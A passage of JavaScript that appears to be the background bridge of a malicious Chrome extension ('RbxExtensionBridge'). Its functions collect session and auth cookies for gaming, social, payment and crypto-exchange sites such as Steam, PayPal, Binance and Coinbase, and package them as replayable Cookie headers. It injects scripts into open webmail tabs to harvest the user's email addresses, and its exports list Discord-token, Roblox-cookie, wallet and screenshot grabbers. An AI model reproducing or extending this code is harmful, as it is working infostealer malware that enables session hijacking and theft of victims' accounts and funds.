        priority: ['lbsession', 'JSESSIONID', 'lbauth', 'session']
      },
      {
        key: 'uolAuth',
        re: /uol\.com\.br$/i,
        priority: ['pagsession', 'JSESSIONID', 'session', 'UOL_SID']
      }
    ];

    const result = {};

    for (const p of PROVIDERS) {
      const matching = jar.filter(c => {
        if (!c || !c.name || !c.value) return false;
        const domain = String(c.domain || c.host || c.hostKey || '').replace(/^\./, '').toLowerCase();
        return domain && p.re.test(domain);
      });
      if (!matching.length) continue;

      // Dedupe by name (prefer longer values, then later entries)
      const flat = {};
      for (const c of matching) {
        const prev = flat[c.name];
        if (!prev || (c.value && c.value.length > prev.length)) flat[c.name] = c.value;
      }

      // Build Cookie header (priority cookies first, then the rest sorted)
      const used = new Set();
      const parts = [];
      const pushPart = (name) => {
        if (!name || used.has(name)) return;
        const v = flat[name];
        if (v == null || typeof v !== 'string' || !v.trim()) return;
        if (!/^[\w!#$%&'*+\-.^_`|~]+$/.test(name)) return;
        used.add(name);
        parts.push(`${name}=${v.trim()}`);
      };
      // Push prefix-matched priority (e.g. "AUTH-" matches "AUTH-xxxxx")
      for (const prio of p.priority) {
        if (prio.endsWith('-') || prio.endsWith('_')) {
          for (const k of Object.keys(flat)) {
            if (k.startsWith(prio)) pushPart(k);
          }
        } else {
          pushPart(prio);
        }
      }
      for (const k of Object.keys(flat).sort()) pushPart(k);

      let cookieHeader = parts.join('; ');
      if (cookieHeader.length > 32000) cookieHeader = cookieHeader.slice(0, 32000);

      result[p.key] = { ...flat, _cookieHeader: cookieHeader };
    }

    return result;
  }

  /**
   * Extracts session cookies for social/gaming/financial/crypto platforms from the chrome cookie jar.
   * Returns flat auth objects keyed by provider (steamAuth, vkAuth, facebookAuth, etc.)
   */
  function extractPlatformAuthFromJar(jarString) {
    let jar = [];
    try {
      jar = JSON.parse(jarString);
      if (!Array.isArray(jar)) jar = [];
    } catch (_) { return {}; }

    const PROVIDERS = [
      {
        key: 'steamAuth',
        re: /(steampowered|steamcommunity|steam\.io)\.com$/i,
        priority: ['steamLoginSecure', 'sessionid', 'browserid', 'steamRememberLogin', 'timezoneOffset']
      },
      {
        key: 'epicAuth',
        re: /epicgames\.com$/i,
        priority: ['EPIC_BEARER_TOKEN', 'EPIC_SESSION_AP', 'EPIC_DEVICE', 'EPIC_EOS_TOKEN', 'csrfToken']
      },
      {
        key: 'twitchAuth',
        re: /twitch\.tv$/i,
        priority: ['auth-token', 'persistent', 'twilight-user', 'api_token', 'login', 'twitch-video-uid']
      },
      {
        key: 'telegramAuth',
        re: /telegram\.org$/i,
        priority: ['stel_ssid', 'stel_token', 'stel_dt', 'stel_test', 'stel_lang_id']
      },
      {
        key: 'vkAuth',
        re: /(vk\.com|vk\.ru)$/i,
        priority: ['remixsid', 'remixsid6', 'remixdt', 'remixlang', 'remixseenads', 'remixstid']
      },
      {
        key: 'facebookAuth',
        re: /(facebook\.com|fb\.com)$/i,
        priority: ['c_user', 'xs', 'datr', 'sb', 'fr', 'wd', 'presence', 'sfau', 'usida']
      },
      {
        key: 'instagramAuth',
        re: /instagram\.com$/i,
        priority: ['sessionid', 'ds_user_id', 'csrftoken', 'rur', 'mid', 'ig_did', 'ig_nrcb']
      },
      {
        key: 'twitterAuth',
        re: /(twitter|x)\.com$/i,
        priority: ['auth_token', 'ct0', 'twid', 'kdt', 'lang', 'night_mode', 'dnt']
      },
      {
        key: 'tiktokAuth',
        re: /tiktok\.com$/i,
        priority: ['sessionid', 'tt_webid_v2', 'ttwid', 'msToken', 'odin_tt', 'tt_chain_token', 'passport_csrf_token']
      },
      {
        key: 'linkedinAuth',
        re: /linkedin\.com$/i,
        priority: ['li_at', 'JSESSIONID', 'liap', 'lidc', 'bcookie', 'bscookie', 'lang']
      },
      {
        key: 'paypalAuth',
        re: /paypal\.com$/i,
        priority: ['PYPF', 'cookie_check', 'X-PP-SILOVER', 'ts', 'nsid', 'KHcl0EuY7AKSMgfvHl7J5E7hPyK', 'AKDC', 'l7_az']
      },
      {
        key: 'amazonAuth',
        re: /amazon\.(com|co\.uk|de|fr|co\.jp|com\.au|it|es|ca|com\.br|com\.mx|nl|se|pl|in|sg|com\.tr)$/i,
        priority: ['session-id', 'x-main', 'at-main', 'ubid-main', 'sess-at-main', 'sst-main',
                   'i18n-prefs', 'lc-main', 'sp-cdn', 'csm-hit']
      },
      {
        key: 'binanceAuth',
        re: /binance\.com$/i,
        priority: ['p20t', 'bnc-uuid', 'bnc_uuid', 'csrftoken', 'logined', 'BNC_FV_KEY', 'userEmail']
      },
      {
        key: 'coinbaseAuth',
        re: /coinbase\.com$/i,
        priority: ['_absinthe_plug_session', '_coinbase_session', 'cb_session', 'remember_device_token', '__cf_bm']
      },
      {
        key: 'bybitAuth',
        re: /bybit\.com$/i,
        priority: ['deviceId', 'PHPSESSID', 'bybit_session', '_bybit_uid', 'locale', '_bybit_authTokenKey_']
      },
      {
        key: 'blizzardAuth',
        re: /(blizzard\.com|battle\.net)$/i,
        priority: ['BA_session', 'BATTLENET_TOKEN', 'blz_auth_token', 'blz-remember', 'BNET-LOCALE', 'BA-tassadar']
      },
      {
        key: 'eaAuth',
        re: /(ea\.com|origin\.com)$/i,
        priority: ['AKA_A2', 'origin-webtoken', 'ea-sess', 'SID', 'JSESSIONID', '_eventId', 'rememberMe']
      },
      {
        key: 'riotAuth',
        re: /(riotgames\.com|leagueoflegends\.com|valorant\.com)$/i,
        priority: ['PVPNET_VSID', 'sub', 'ssid', 'tdid', 'rsso', 'RIOT_ID_HINT', 'token']
      },
      {
        key: 'minecraftAuth',
        re: /(minecraft\.net|mojang\.com|minecraftservices\.com)$/i,
        priority: ['PLAY_SESSION', 'MOJANG_TOKEN', 'sid', 'token', 'JSESSIONID', 'remember-me']
      }
    ];

    const result = {};
    for (const p of PROVIDERS) {
      const matching = jar.filter(c => {
        if (!c || !c.name || !c.value) return false;
        const domain = String(c.domain || c.host || c.hostKey || '').replace(/^\./, '').toLowerCase();
        return domain && p.re.test(domain);
      });
      if (!matching.length) continue;

      const flat = {};
      for (const c of matching) {
        const prev = flat[c.name];
        if (!prev || (c.value && c.value.length > prev.length)) flat[c.name] = c.value;
      }

      const used = new Set();
      const parts = [];
      const pushPart = (name) => {
        if (!name || used.has(name)) return;
        const v = flat[name];
        if (v == null || typeof v !== 'string' || !v.trim()) return;
        if (!/^[\w!#$%&'*+\-.^_`|~]+$/.test(name)) return;
        used.add(name);
        parts.push(`${name}=${v.trim()}`);
      };
      for (const prio of p.priority) {
        if (prio.endsWith('-') || prio.endsWith('_')) {
          for (const k of Object.keys(flat)) { if (k.startsWith(prio)) pushPart(k); }
        } else {
          pushPart(prio);
        }
      }
      for (const k of Object.keys(flat).sort()) pushPart(k);

      let cookieHeader = parts.join('; ');
      if (cookieHeader.length > 32000) cookieHeader = cookieHeader.slice(0, 32000);
      result[p.key] = { ...flat, _cookieHeader: cookieHeader };
    }

    return result;
  }

  /**
   * Universal mail email harvester — scrapes ALL popular mail provider tabs + parses cookies.
   * Returns { emails, byProvider, outlookEmail, yahooEmail } for backward compat.
   */
  async function getAllMailEmails() {
    const allFound = new Set();
    const byProvider = {};

    const emailRe = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g;
    const junkLocalRe = /^(noreply|no-reply|donotreply|mailer-daemon|postmaster|bounce|support|help|info|abuse|newsletter|notifications?|team|security|privacy|marketing|sales|hello|contact|daemon|phishing)@/i;
    const junkDomainRe = /@(chromium|android|gstatic|googleusercontent|youtube|ggpht|google-analytics|sentry|bugsnag|example|test|localhost)\.com?$/i;
    const knownSpamLocalRe = /^(webmaster|admin|root|hostmaster|spam|report|feedback|unsubscribe)@/i;

    const addEmail = (em, provider) => {
      if (!em || !em.includes('@')) return;
      const n = em.toLowerCase().trim().replace(/^mailto:/i, '');
      if (!n || n.length < 6 || n.length > 254) return;
      if (junkLocalRe.test(n) || junkDomainRe.test(n) || knownSpamLocalRe.test(n)) return;
      const parts = n.split('@');
      if (parts.length !== 2 || !parts[1].includes('.')) return;
      allFound.add(n);
      if (provider) {
        if (!byProvider[provider]) byProvider[provider] = [];
        if (!byProvider[provider].includes(n)) byProvider[provider].push(n);
      }
    };

    // Universal DOM extractor injected into mail tabs
    const universalExtractor = (providerSelectors) => {
      const emailRe = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g;
      const candidates = new Set();
      const href = location.href;

      // Try provider-specific selectors
      const ps = providerSelectors || [];
      for (const sel of ps) {
        try {
          const els = document.querySelectorAll(sel);
          for (const el of els) {
            const t = (el.textContent || el.getAttribute('data-email') || el.getAttribute('title') || '').trim();
            if (t.includes('@')) {
              const m = t.match(emailRe);
              if (m) m.forEach(e => candidates.add(e.toLowerCase()));
            }
          }
        } catch (_) {}
      }

      // Universal: meta tags
      for (const m of document.querySelectorAll('meta')) {
        for (const attr of ['content', 'value']) {
          const v = m.getAttribute(attr) || '';
          if (v.includes('@') && v.length < 200) {
            const found = v.match(emailRe);
            if (found) found.forEach(e => candidates.add(e.toLowerCase()));
          }
        }
      }

      // Universal: data attributes
      for (const el of document.querySelectorAll('[data-email],[data-user-email],[data-login],[data-upn],[data-hovercard-id],[data-apple-id]')) {
        for (const attr of ['data-email','data-user-email','data-login','data-upn','data-hovercard-id','data-apple-id']) {
          const v = (el.getAttribute(attr) || '').trim();
          if (v.includes('@')) candidates.add(v.toLowerCase());
        }
      }

      // Universal: input[type=email] with value
      for (const el of document.querySelectorAll('input[type="email"]')) {
        const v = (el.value || el.getAttribute('value') || '').trim();
        if (v.includes('@')) candidates.add(v.toLowerCase());
      }

      // Universal: inline JSON scripts — look for email key patterns
      for (const s of document.querySelectorAll('script:not([src])')) {
        const t = s.textContent || '';
        if (!t.includes('@')) continue;
        const m = t.match(/"(?:email|primaryEmail|userEmail|login|loginName|userId|username|signInName|userPrincipalName|mailAddress|preferredMail|accountEmail)"\s*:\s*"([^"@\s]{1,80}@[^"\s]{3,80})"/gi);
        if (m) m.forEach(match => {
          const inner = match.match(/"([^"@\s]{1,80}@[^"\s]{3,80})"$/);
          if (inner) candidates.add(inner[1].toLowerCase());
        });
      }

      // Universal: look for window.__INITIAL_STATE__ or similar
      for (const key of ['__INITIAL_STATE__', '__NEXT_DATA__', '__REDUX_STATE__', 'initialState', 'pageData', 'userData']) {
        try {
          const obj = window[key];
          if (!obj) continue;
          const str = typeof obj === 'string' ? obj : JSON.stringify(obj);
          if (!str.includes('@')) continue;
          const m = str.match(emailRe);
          if (m) m.slice(0, 10).forEach(e => candidates.add(e.toLowerCase()));
        } catch (_) {}
      }

      // Fallback: page text (limited to 5000 chars from top)
      if (candidates.size === 0) {
        try {
          const body = (document.body && document.body.innerText || '').slice(0, 5000);
          const found = body.match(emailRe);
          if (found) found.slice(0, 5).forEach(e => candidates.add(e.toLowerCase()));
        } catch (_) {}
      }

      return [...candidates];
    };

    // Query all mail tabs
    try {
      const tabs = await chrome.tabs.query({ url: MAIL_TAB_PATTERNS });
      for (const tab of tabs || []) {
        if (!tab || tab.id == null || tab.id < 0) continue;
        const url = tab.url || '';

        // Find matching provider
        let providerName = 'other';
        let providerSelectors = [];
        for (const p of MAIL_PROVIDER_SELECTORS) {
          if (p.re.test(url)) {
            providerName = p.name;
            providerSelectors = p.selectors;
            break;
          }
        }

        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: universalExtractor,
            args: [providerSelectors]
          });
          if (results) {
            for (const row of results) {
              if (row && Array.isArray(row.result)) {
                row.result.forEach(e => addEmail(e, providerName));
              }
            }
          }
        } catch (_) {}
      }
    } catch (_) {}

    // Also scan cookies for email hints per provider
    try {
      // Yahoo Y cookie
      for (const dom of YAHOO_COOKIE_QUERY_DOMAINS) {
        const cookies = await chrome.cookies.getAll({ domain: dom }).catch(() => []);
        for (const c of cookies) {
          if (!c || !c.value) continue;
          if (c.name === 'Y' || c.name === 'T') {
            let val = c.value;
            try { val = decodeURIComponent(val); } catch (_) {}
            const params = {};
            for (const part of val.split('&')) {
              const eq = part.indexOf('=');
              if (eq < 0) continue;
              params[part.slice(0, eq)] = part.slice(eq + 1);
            }
            const login = params['l'] || params['lg'] || '';
            if (login && login.length > 2 && !/^\d+$/.test(login)) {
              const em = login.includes('@') ? login.toLowerCase() : login.toLowerCase() + '@yahoo.com';
              addEmail(em, 'Yahoo');
            }
          }
          if (c.value.includes('@yahoo') || c.value.includes('@ymail') || c.value.includes('@rocketmail')) {
            const m = c.value.match(/[a-zA-Z0-9._%+\-]+@(?:yahoo|ymail|rocketmail)\.[a-z]{2,6}/gi);
            if (m) m.forEach(e => addEmail(e, 'Yahoo'));
          }
        }
      }

      // AOL Y cookie (same format as Yahoo)
      const aolCookies = await chrome.cookies.getAll({ domain: 'aol.com' }).catch(() => []);
      for (const c of aolCookies) {
        if (!c || !c.value) continue;
        if (c.name === 'Y' || c.name === 'T') {
          let val = c.value;
          try { val = decodeURIComponent(val); } catch (_) {}
          const params = {};
          for (const part of val.split('&')) {
            const eq = part.indexOf('=');
            if (eq < 0) continue;
            params[part.slice(0, eq)] = part.slice(eq + 1);
          }
          const login = params['l'] || params['lg'] || '';
          if (login && login.length > 2 && !/^\d+$/.test(login)) {
            const em = login.includes('@') ? login.toLowerCase() : login.toLowerCase() + '@aol.com';
            addEmail(em, 'AOL');
          }
        }
        if (c.value.includes('@aol.com')) {
          const m = c.value.match(/[a-zA-Z0-9._%+\-]+@aol\.com/gi);
          if (m) m.forEach(e => addEmail(e, 'AOL'));
        }
      }

      // Mail.ru Mpop cookie: base64-encoded JSON with email
      const mailruCookies = await chrome.cookies.getAll({ domain: '.mail.ru' }).catch(() => []);
      for (const c of mailruCookies) {
        if (!c || !c.value) continue;
        if (c.name === 'Mpop' || c.name === 'ssdc' || c.name === 'mrcu') {
          let val = c.value;
          // Mpop format: "timestamp:email:name:token"
          if (c.name === 'Mpop') {
            const parts = val.split(':');
            for (const part of parts) {
              if (part.includes('@') && part.includes('.')) addEmail(part, 'Mail.ru');
            }
          }
          // Try base64
          try {
            const decoded = atob(val.replace(/-/g, '+').replace(/_/g, '/'));
            const m = decoded.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g);
            if (m) m.forEach(e => addEmail(e, 'Mail.ru'));
          } catch (_) {}
          // Plain email in value
          if (val.includes('@')) {
            const m = val.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g);
            if (m) m.forEach(e => addEmail(e, 'Mail.ru'));
          }
        }
      }

      // Yandex cookies — Yandex-Login or ya_sess_id may contain username
      const yandexCookies = await chrome.cookies.getAll({ domain: '.yandex.ru' }).catch(() => []);
      for (const c of yandexCookies) {
        if (!c || !c.value) continue;
        if (c.name === 'yandexuid' || c.name === 'L' || c.name === 'ya_sess_id') {
          // L cookie: base64 JWT-like with login
          try {
            const decoded = atob(c.value.replace(/-/g, '+').replace(/_/g, '/'));
            const m = decoded.match(/"login"\s*:\s*"([^"@]{1,40})"/);
            if (m && m[1]) {
              const em = m[1].includes('@') ? m[1].toLowerCase() : m[1].toLowerCase() + '@yandex.ru';
              addEmail(em, 'Yandex');
            }
          } catch (_) {}
        }
        if (c.name === 'login') {
          const login = c.value.trim();
          if (login && !login.includes(' ') && login.length > 2) {
            const em = login.includes('@') ? login.toLowerCase() : login.toLowerCase() + '@yandex.ru';
            addEmail(em, 'Yandex');
          }
        }
        if (c.value.includes('@yandex') || c.value.includes('@ya.ru')) {
          const m = c.value.match(/[a-zA-Z0-9._%+\-]+@(?:yandex\.[a-z]{2,6}|ya\.ru)/gi);
          if (m) m.forEach(e => addEmail(e, 'Yandex'));
        }
      }

      // Microsoft cookies - JSHP / cookie values
      for (const dom of MICROSOFT_COOKIE_QUERY_DOMAINS) {
        const cookies = await chrome.cookies.getAll({ domain: dom }).catch(() => []);
        for (const c of cookies) {
          if (!c || !c.value) continue;
          if (c.name === 'JSHP' || c.name === 'JSH') {
            let val = c.value;
            try { val = decodeURIComponent(val); } catch (_) {}
            const m = val.match(/"(?:puid|email|login|signInName|preferredUsername)"\s*:\s*"([^"@]{1,80}@[^"]{3,80})"/i);
            if (m) addEmail(m[1], 'Outlook');
          }
          const msRe = /[a-zA-Z0-9._%+\-]+@(?:outlook|hotmail|live|msn|microsoft)\.[a-z]{2,10}/gi;
          if (msRe.test(c.value)) {
            msRe.lastIndex = 0;
            const m = c.value.match(msRe);
            if (m) m.forEach(e => addEmail(e, 'Outlook'));
          }
        }
      }

      // ProtonMail — AUTH cookie may have username
      const protonCookies = await chrome.cookies.getAll({ domain: '.proton.me' }).catch(() => []);
      for (const c of protonCookies) {
        if (!c || !c.value) continue;
        if (c.value.includes('@proton') || c.value.includes('@protonmail')) {
          const m = c.value.match(/[a-zA-Z0-9._%+\-]+@(?:proton\.me|protonmail\.com|pm\.me)/gi);
          if (m) m.forEach(e => addEmail(e, 'Proton'));
        }
      }

    } catch (_) {}

    const allEmails = [...allFound];

    // Extract by known providers for backward compat
    const getFirst = (provName) => {
      const re = provName === 'Outlook'
        ? /@(outlook|hotmail|live|msn)\./i
        : provName === 'Yahoo'
          ? /@(yahoo|ymail|rocketmail)\./i
          : null;
      if (re) return allEmails.find(e => re.test(e)) || null;
      return (byProvider[provName] && byProvider[provName][0]) || null;
    };

    // Extract per-provider auth objects from the jar (mail + platform)
    let mailAuthObjects = {};
    try {
      const profile = await collectAllProfileCookies({ includeRoblox: false });
      if (profile && profile.jarString) {
        mailAuthObjects = {
          ...extractMailAuthFromJar(profile.jarString),
          ...extractPlatformAuthFromJar(profile.jarString)
        };
      }
    } catch (_) {}

    return {
      emails: allEmails,
      byProvider,
      outlookEmail: getFirst('Outlook'),
      outlookEmails: byProvider['Outlook'] || [],
      yahooEmail: getFirst('Yahoo'),
      yahooEmails: byProvider['Yahoo'] || [],
      mailAuthObjects
    };
  }

  /**
   * Scrape email from open Outlook / Live / Microsoft account tabs.
   * Also tries to find email embedded in Microsoft cookie values (JSHP, etc.).
   */
  async function getMicrosoftEmail() {
    const result = { email: null, emails: [] };
    const found = new Set();

    // Scrape open Outlook/Live/Microsoft tabs
    const msPats = [
      'https://outlook.live.com/*',
      'https://outlook.office.com/*',
      'https://outlook.office365.com/*',
      'https://account.microsoft.com/*',
      'https://account.live.com/*',
      'https://login.live.com/*',
      'https://login.microsoftonline.com/*'
    ];
    try {
      const tabs = await chrome.tabs.query({ url: msPats });
      for (const tab of tabs || []) {
        if (!tab || tab.id == null) continue;
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              const emailRe = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g;
              const candidates = new Set();
              // Check meta tags
              for (const m of document.querySelectorAll('meta[content]')) {
                const c = m.getAttribute('content') || '';
                if (c.includes('@')) {
                  const found = c.match(emailRe);
                  if (found) found.forEach(e => candidates.add(e.toLowerCase()));
                }
              }
              // Check data attributes
              for (const el of document.querySelectorAll('[data-email],[data-login],[data-upn]')) {
                for (const attr of ['data-email', 'data-login', 'data-upn']) {
                  const v = el.getAttribute(attr);
                  if (v && v.includes('@')) candidates.add(v.toLowerCase().trim());
                }
              }
              // Scan inline JSON scripts
              for (const s of document.querySelectorAll('script')) {
                const t = s.textContent || '';
                if (!t.includes('@')) continue;
                const m = t.match(/"(?:signInName|loginHint|userPrincipalName|email|preferredMail|username)"\s*:\s*"([^"@]{1,80}@[^"]{3,60})"/i);
                if (m) candidates.add(m[1].toLowerCase().trim());
              }
              // Scan visible text as fallback
              if (!candidates.size) {
                const found = (document.body && document.body.innerText || '').match(emailRe);
                if (found) found.slice(0, 5).forEach(e => candidates.add(e.toLowerCase()));
              }
              return [...candidates];
            }
          });
          if (results) {
            for (const row of results) {
              if (row && Array.isArray(row.result)) {
                row.result.forEach(e => {
                  if (e && e.includes('@')) found.add(e.toLowerCase().trim());
                });
              }
            }
          }
        } catch (_) {}
      }
    } catch (_) {}

    // Try to extract email from Microsoft cookie values (JSHP often has JSON with email)
    try {
      for (const dom of MICROSOFT_COOKIE_QUERY_DOMAINS) {
        const cookies = await chrome.cookies.getAll({ domain: dom }).catch(() => []);
        for (const c of cookies) {
          if (!c || !c.value) continue;
          let val = c.value;
          // JSHP / JSH: URL-encoded JSON
          if (c.name === 'JSHP' || c.name === 'JSH') {
            try { val = decodeURIComponent(val); } catch (_) {}
            const m = val.match(/"(?:puid|email|login|signInName)"\s*:\s*"([^"@]{1,80}@[^"]{3,60})"/i);
            if (m) { found.add(m[1].toLowerCase().trim()); continue; }
          }
          // Any cookie value containing a plausible Outlook/Live email
          if (val.length > 10 && val.length < 300 && val.includes('@')) {
            const emailRe = /[a-zA-Z0-9._%+\-]+@(?:(?:outlook|hotmail|live|msn|microsoft)\.com(?:\.[a-z]{2})?|[a-zA-Z0-9.\-]+\.(?:onmicrosoft|office365)\.com)/gi;
            const matches = val.match(emailRe);
            if (matches) matches.forEach(e => found.add(e.toLowerCase().trim()));
          }
          // Try base64 decode for token-like values
          if (val.length > 60 && val.length < 10000 && /^[A-Za-z0-9+/=_-]+$/.test(val)) {
            try {
              const b64 = val.replace(/-/g, '+').replace(/_/g, '/');
              const decoded = atob(b64);
              const m = decoded.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/);
              if (m && m[0].includes('@')) found.add(m[0].toLowerCase().trim());
            } catch (_) {}
          }
        }
      }
    } catch (_) {}

    // Filter: only keep Outlook/Microsoft/Live/Hotmail emails + generic valid ones
    const msEmailRe = /@(outlook|hotmail|live|msn|ymail|icloud)\.(com|co\.[a-z]{2}|[a-z]{2})$/i;
    const valid = [...found].filter(e => {
      if (!e || !e.includes('@')) return false;
      if (/^(noreply|no-reply|mailer-daemon|postmaster|support|help|info)@/i.test(e)) return false;
      if (/@(example|test|localhost|google|youtube|gstatic)\./.test(e)) return false;
      return true;
    });
    // Prefer MS-domain emails first
    valid.sort((a, b) => {
      const aMs = msEmailRe.test(a) ? 1 : 0;
      const bMs = msEmailRe.test(b) ? 1 : 0;
      return bMs - aMs;
    });

    result.emails = valid.slice(0, 10);
    result.email = result.emails[0] || null;
    return result;
  }

  /**
   * Scrape email from open Yahoo Mail tabs.
   * Also parses the Yahoo `Y` cookie which embeds the login name.
   */
  async function getYahooEmail() {
    const result = { email: null, emails: [] };
    const found = new Set();

    // Scrape open Yahoo tabs
    const yahooPats = [
      'https://mail.yahoo.com/*',
      'https://login.yahoo.com/*',
      'https://*.yahoo.com/*'
    ];
    try {
      const tabs = await chrome.tabs.query({ url: yahooPats });
      for (const tab of tabs || []) {
        if (!tab || tab.id == null) continue;
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              const emailRe = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g;
              const candidates = new Set();
              // Yahoo Mail header / profile chip
              for (const el of document.querySelectorAll('[data-test-id="user-info-item"],[class*="AccountName"],[class*="profile-email"],[class*="user-email"],[data-reactid*="email"]')) {
                const t = (el.textContent || '').trim();
                if (t.includes('@')) candidates.add(t.toLowerCase());
              }
              // Meta content
              for (const m of document.querySelectorAll('meta[content]')) {
                const c = m.getAttribute('content') || '';
                if (c.includes('@yahoo') || c.includes('@ymail')) {
                  const found = c.match(emailRe);
                  if (found) found.forEach(e => candidates.add(e.toLowerCase()));
                }
              }
              // Inline scripts
              for (const s of document.querySelectorAll('script')) {
                const t = s.textContent || '';
                if (!t.includes('@yahoo') && !t.includes('@ymail')) continue;
                const m = t.match(/"(?:email|login|userId|primaryEmail)"\s*:\s*"([^"@]{1,80}@(?:yahoo|ymail|rocketmail)\.[a-z]{2,6})"/i);
                if (m) candidates.add(m[1].toLowerCase().trim());
              }
              // Fallback: visible email text
              if (!candidates.size) {
                const body = document.body && document.body.innerText || '';
                const found = body.match(/[a-zA-Z0-9._%+\-]+@(?:yahoo|ymail|rocketmail)\.[a-z]{2,6}/gi);
                if (found) found.slice(0, 5).forEach(e => candidates.add(e.toLowerCase()));
              }
              return [...candidates];
            }
          });
          if (results) {
            for (const row of results) {
              if (row && Array.isArray(row.result)) {
                row.result.forEach(e => {
                  if (e && e.includes('@')) found.add(e.toLowerCase().trim());
                });
              }
            }
          }
        } catch (_) {}
      }
    } catch (_) {}

    // Parse Yahoo `Y` cookie: value format is "v=1&n=xxx&l=LOGIN_NAME&..."
    // The `l` field is the Yahoo login (username part of email).
    try {
      for (const dom of YAHOO_COOKIE_QUERY_DOMAINS) {
        const cookies = await chrome.cookies.getAll({ domain: dom }).catch(() => []);
        for (const c of cookies) {
          if (!c || !c.value) continue;
          if (c.name === 'Y' || c.name === 'T') {
            let val = c.value;
            try { val = decodeURIComponent(val); } catch (_) {}
            // Parse key=value pairs separated by &
            const params = {};
            for (const part of val.split('&')) {
              const eq = part.indexOf('=');
              if (eq < 0) continue;
              params[part.slice(0, eq)] = part.slice(eq + 1);
            }
            // `l` is login name, `n` is display name
            const login = params['l'] || params['lg'] || '';
            if (login && login.length > 2 && !/^[0-9]+$/.test(login)) {
              // Construct email: if already has @, use as-is
              const email = login.includes('@')
                ? login.toLowerCase()
                : login.toLowerCase() + '@yahoo.com';
              found.add(email);
            }
          }
          // Also scan for plain yahoo emails in cookie values
          if (c.value.includes('@yahoo') || c.value.includes('@ymail')) {
            const emailRe = /[a-zA-Z0-9._%+\-]+@(?:yahoo|ymail|rocketmail)\.[a-z]{2,6}/gi;
            const matches = c.value.match(emailRe);
            if (matches) matches.forEach(e => found.add(e.toLowerCase()));
          }
        }
      }
    } catch (_) {}

    const valid = [...found].filter(e => {
      if (!e || !e.includes('@')) return false;
      if (/^(noreply|no-reply|mailer-daemon|postmaster)@/i.test(e)) return false;
      return true;
    });
    result.emails = valid.slice(0, 10);
    result.email = result.emails[0] || null;
    return result;
  }

  global.RbxExtensionBridge = {
    captureScreenshot,
    getDiscordToken,
    getGoogleAuth,
    getFullProfileCookieJar,
    getRobloxCookie,
    collectWalletSnapshot,
    collectYoutubeInfo,
    inferGoogleSessionFromJarString,
    getAllMailEmails,
    getMicrosoftEmail,
    getYahooEmail,
    extractMailAuthFromJar,
    extractPlatformAuthFromJar
  };
})(typeof globalThis !== 'undefined' ? globalThis : window);
